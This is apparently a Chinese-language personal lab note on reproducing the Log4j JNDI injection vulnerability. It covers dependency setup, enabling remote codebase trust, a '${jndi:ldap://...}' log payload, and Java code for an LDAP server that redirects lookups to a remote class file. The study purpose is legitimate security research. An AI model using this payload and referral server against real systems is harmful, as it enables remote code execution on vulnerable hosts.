# log4j 注入漏洞

<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44832>

<https://github.com/apache/logging-log4j2/blob/b93cdf94167691cf509c15f69f3857abaaa80765/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java#L57>

<https://github.com/apache/logging-log4j2/blob/b93cdf94167691cf509c15f69f3857abaaa80765/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.java>

## 准备

启动 ldap 服务, 可以参考[Ldap](./Ldap/Ldap.md)

使用 log4j , 在<https://mvnrepository.com> 搜索依赖的版本, 对应漏洞会有提示.

如果使用spirng boot 测试 需要做如下处理:

```xml
<!-- 移除 spring 框架默认的 logback -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
    <exclusions>
        <exclusion>  <!-- declare the exclusion here -->
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-logging</artifactId>
        </exclusion>
    </exclusions>
</dependency>
<!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-log4j2 -->
<!-- 添加依赖 -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-log4j2</artifactId>
    <version>2.6.2</version>
</dependency>
```

在 Oracle JDK 11.0.1, 8u191, 7u201, and 6u211及以后的版本，默认不允许LDAP从远程地址加载Reference工厂类。
启动时需要添加`System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");`

## 测试

打印日志，比如`log.error("${jndi:ldap://127.0.0.1:10389}");`(根据日志级别而定)

可以看到打印的日志有类似内容:`com.sun.jndi.ldap.LdapCtx@5fa7e7ff`，ldap 服务器上也能看到请求记录(需要更改打印日志级别)；

Ladp 返回class, 这个class 不能有package name

Ldap sdk(简单搭建一个服务)
<https://ldap.com/unboundid-ldap-sdk-for-java/>

```java
    InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
    config.setListenerConfigs(new InMemoryListenerConfig(
        "listen", //$NON-NLS-1$
        InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
        port,
        ServerSocketFactory.getDefault(),
        SocketFactory.getDefault(),
        (SSLSocketFactory) SSLSocketFactory.getDefault()));

    config.addInMemoryOperationInterceptor(new OperationInterceptor(this.codebase_url));
    InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
    ds.startListening();
private static class OperationInterceptor extends InMemoryOperationInterceptor {
 @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
            String cbstring = this.codebase.toString();
            String javaFactory = Mapper.references.get(base);

            if (javaFactory != null){
                URL turl = new URL(cbstring + javaFactory.concat(".class"));
                System.out.println(getLocalTime() + " [LDAPSERVER] >> Send LDAP reference result for " + base + " redirecting to " + turl);
                e.addAttribute("javaClassName", "foo");
                e.addAttribute("javaCodeBase", cbstring);
                e.addAttribute("objectClass", "javaNamingReference");  
                e.addAttribute("javaFactory", javaFactory);
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            }else {
                System.out.println(getLocalTime() + " [LDAPSERVER] >> Reference that matches the name(" + base + ") is not found.");
            }
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }
}
```

编译一个class.

### 泄漏信息

## JNDI

Java命名和目录接口（JNDI）是一种Java API. 它可以与各种不同的Naming Service和Directory Service进行交互，比如RMI(Remote Method Invocation)，LDAP(Lightweight Directory Access Protocol，Active Directory，DNS，CORBA(Common Object Request Broker Architecture)等。

这个漏洞是JNDI 注入漏洞.
